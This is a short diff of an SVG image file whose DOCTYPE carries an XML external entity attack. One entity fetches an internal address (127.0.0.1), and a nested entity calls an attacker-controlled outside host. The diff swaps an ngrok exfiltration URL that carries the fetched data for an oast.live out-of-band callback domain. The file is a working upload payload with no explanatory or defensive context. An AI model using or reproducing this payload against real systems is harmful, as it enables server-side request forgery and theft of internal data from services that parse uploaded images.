@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
   <!ENTITY % file SYSTEM "http://127.0.0.1:80/">
-  <!ENTITY % payload "<!ENTITY send SYSTEM 'https://televisional-camryn-quarrelsomely.ngrok-free.dev/out?data=%file;'>">
+  <!ENTITY % payload "<!ENTITY send SYSTEM 'https://d7bd1okgtqkkc3i8ij3gs8ghg89xzw7zm.oast.live;'>">
   %payload;
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
